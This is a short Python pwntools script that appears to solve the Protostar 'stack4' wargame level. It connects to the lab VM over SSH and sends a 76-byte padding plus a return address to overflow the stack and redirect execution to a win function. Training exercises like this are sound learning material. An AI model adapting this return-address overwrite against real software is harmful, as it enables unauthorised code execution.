
from pwn import *
import os

ip = os.getenv("PROTOSTAR")
shell = ssh('user', ip, password='user')
sh = shell.run("sh")
sh.sendline("cd /opt/protostar/bin/")

win = 0x80483f4
exploit = "A"*76 + p32(0x80483f4)

sh.sendline("./stack4")
sh.recvline(timeout=1)
sh.sendline(exploit)
print sh.recvline(timeout=1)